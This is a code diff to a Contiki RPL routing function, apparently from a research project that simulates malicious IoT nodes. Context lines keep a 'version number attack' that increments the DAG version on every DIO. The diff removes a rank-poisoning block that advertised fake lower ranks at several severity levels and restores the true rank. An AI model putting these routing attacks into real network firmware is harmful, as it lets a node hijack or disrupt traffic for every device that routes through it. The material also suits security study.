@@ -523,6 +523,10 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
   // Version number attack: Increasing dag->version
   buffer[pos++] = ++ (dag->version); // George version number of whom? Mine or child?
 
+#ifndef PRINT_VERSION_INCREASE
+#define PRINT_VERSION_INCREASE 1
+#endif
+
 #if PRINT_VERSION_INCREASE
   printf("Version number increased: ++ (dag->version)\n");
 #endif
@@ -534,54 +538,7 @@ dio_output(rpl_instance_t *instance, uip_ipaddr_t *uc_addr)
   printf("RPL: LEAF ONLY DIO rank set to INFINITE_RANK\n");
   set16(buffer, pos, INFINITE_RANK);
 #else /* RPL_LEAF_ONLY */
-
-/******************** POISONING DIOs *****************************/
-  /* George Poisoining the DIO sent to neighbors:
-   * The rank of the malicious node is fakely advertised as lower.
-   * it can be three different levels: light, adequate, severe.
-   * In all cases, if the malicious is closer to the sink, the rank
-   * will be slightly above the sink's rank (So RPL will root 
-   * normally from nodes via the malicious to the sink.
-   * Sink's rank is usually 128, PARENT_SWITCH_THRESHOLD is 96 or 160.
-   * A node's rank should not be lesser than the sink, hence it should 
-   * be more than 128. 
-   * Choose wisely....
-   */
-   int fake_rank; 
-   switch(MALICIOUS_LEVEL){ 
-	  case 4:
-		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
-		 	 2*PARENT_SWITCH_THRESHOLD ?
-			 dag->rank - 8*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
-	  	 break;
-	  case 3:
-		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 				       	 
-		 	 2*PARENT_SWITCH_THRESHOLD ?
-			 dag->rank - 6*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;	 
-	  	 break;
-	  case 2:
-		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD > 
-		 	 2*PARENT_SWITCH_THRESHOLD ?
-			 dag->rank - 4*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
-	    break;
-	  case 1:
-		 fake_rank = dag->rank - 3*PARENT_SWITCH_THRESHOLD >
-		 	 2*PARENT_SWITCH_THRESHOLD ?
-			 dag->rank - 2*PARENT_SWITCH_THRESHOLD : PARENT_SWITCH_THRESHOLD;		 
-	    break; 
-	  default: // All other number
- 	  		PRINTF("No MALICIOUS_LEVEL set, NORMAL dag->rank\n");
- 	  		fake_rank = dag->rank;
-  }
-  PRINTF("PARENT_SWITCH_THRESHOLD:%d, dag->rank:%d, fake:%d\n",
-  			PARENT_SWITCH_THRESHOLD, dag->rank,fake_rank);
-  PRINTF("MALICIOUS_LEVEL %d\n", MALICIOUS_LEVEL);
-
-  set16(buffer, pos, fake_rank);
-  //set16(buffer, pos, dag->rank);
-  
-/************************************************************************/  
-  
+  set16(buffer, pos, dag->rank);
 #endif /* RPL_LEAF_ONLY */
   pos += 2;
 
